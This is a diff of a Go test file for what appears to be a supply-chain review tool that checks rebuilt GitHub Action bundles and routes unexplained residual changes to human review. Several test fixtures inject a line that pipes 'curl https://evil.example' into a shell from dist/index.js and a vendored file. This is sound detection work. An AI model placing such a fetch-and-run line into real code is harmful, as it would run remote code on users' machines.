@@ -4,9 +4,11 @@ import (
 	"context"
 	"encoding/base64"
 	"encoding/json"
+	"fmt"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"strings"
 	"testing"
 
@@ -407,6 +409,59 @@ func TestFetchScenarios(t *testing.T) {
 			v2: func(f map[string]string) {
 				f["dist/index.js"] = strings.Replace(f["dist/index.js"], "  return 0;", "  require('child_process').execSync('curl https://evil.example | sh');\n  return 0;", 1)
 			}},
+		// A rebuildable action: a verified rebuild sends the residual to
+		// review only when no locked package changed and every changed
+		// file is first-party source or inside the rebuilt directories.
+		{name: "residual a rebuild can clear", want: model.RouteHuman, codes: []string{"actions.dist-residual"},
+			v1: rebuildableLock,
+			v2: func(f map[string]string) {
+				f["package-lock.json"] = v1Files()["package-lock.json"]
+				rebuildableLock(f)
+				f["dist/index.js"] = strings.Replace(f["dist/index.js"], "  return 0;", "  require('child_process').execSync('curl https://evil.example | sh');\n  return 0;", 1)
+			},
+			check: func(t *testing.T, res fetch.Result, ev *memEvidence) {
+				if len(res.Rebuilds) != 1 || !residualIfRebuilt(res) {
+					t.Errorf("rebuilds %d, residual not marked IfRebuilt: %+v\n%s", len(res.Rebuilds), res.Findings, ev.files["actions/summary.md"].content)
+				}
+				// The relaxed residual is required reading in full.
+				found := false
+				for _, d := range res.Diffs {
+					if d.Path == "dist/index.js" && d.Required && strings.Contains(string(ev.files[d.File].content), "child_process") {
+						found = true
+					}
+				}
+				if !found {
+					t.Errorf("no required full diff of dist/index.js: %+v", res.Diffs)
+				}
+			}},
+		{name: "residual with a locked package change", want: model.RouteHuman, codes: []string{"actions.dist-residual"},
+			v1: rebuildableLock,
+			v2: func(f map[string]string) {
+				rebuildableLock(f)
+				f["dist/index.js"] = strings.Replace(f["dist/index.js"], "  return 0;", "  require('child_process').execSync('curl https://evil.example | sh');\n  return 0;", 1)
+			},
+			check: func(t *testing.T, res fetch.Result, ev *memEvidence) {
+				if len(res.Rebuilds) != 1 || residualIfRebuilt(res) {
+					t.Errorf("rebuilds %d, residual marked IfRebuilt despite a lock change: %+v", len(res.Rebuilds), res.Findings)
+				}
+			}},
+		{name: "residual with a change outside the shown and rebuilt files", want: model.RouteHuman, codes: []string{"actions.dist-residual"},
+			v1: rebuildableLock,
+			v2: func(f map[string]string) {
+				f["package-lock.json"] = v1Files()["package-lock.json"]
+				rebuildableLock(f)
+				f["vendor/dist/stash.js"] = "require('child_process').execSync('curl https://evil.example | sh')\n"
+				f["dist/index.js"] = strings.Replace(f["dist/index.js"], "  return 0;", "  require('child_process').execSync('curl https://evil.example | sh');\n  return 0;", 1)
+			},
+			check: func(t *testing.T, res fetch.Result, ev *memEvidence) {
+				if residualIfRebuilt(res) {
+					t.Errorf("residual marked IfRebuilt despite an unshown change: %+v", res.Findings)
+				}
+			}},
+		{name: "stray source map", want: model.RouteHuman, codes: []string{"actions.dist-residual"},
+			v2: func(f map[string]string) {
+				f["tools/dist/banner.js.map"] = `{"version":3,"sources":[],"mappings":"","x":"payload"}`
+			}},
 		{name: "first-party bundle change without source change", want: model.RouteHuman, codes: []string{"actions.dist-residual"},
 			v2: func(f map[string]string) {
 				f["src/main.ts"] = v1Files()["src/main.ts"]
@@ -616,4 +671,25 @@ func TestFetchScenarios(t *testing.T) {
 			runScenario(t, sc)
 		})
 	}
+}
+
+var lockEntryRe = regexp.MustCompile(`"node_modules/([^"]+)":\{"version":"([^"]+)"\}`)
+
+// rebuildableLock gives every locked package a registry tarball and
+// sha512 integrity, so the rebuild job can rebuild the action.
+func rebuildableLock(f map[string]string) {
+	f["package-lock.json"] = lockEntryRe.ReplaceAllStringFunc(f["package-lock.json"], func(m string) string {
+		g := lockEntryRe.FindStringSubmatch(m)
+		base := g[1][strings.LastIndex(g[1], "/")+1:]
+		return fmt.Sprintf(`"node_modules/%s":{"version":"%s","resolved":"https://registry.npmjs.org/%s/-/%s-%s.tgz","integrity":"sha512-AAAA"}`, g[1], g[2], g[1], base, g[2])
+	})
+}
+
+func residualIfRebuilt(res fetch.Result) bool {
+	for _, f := range res.Findings {
+		if f.Code == "actions.dist-residual" {
+			return f.IfRebuilt
+		}
+	}
+	return false
 }
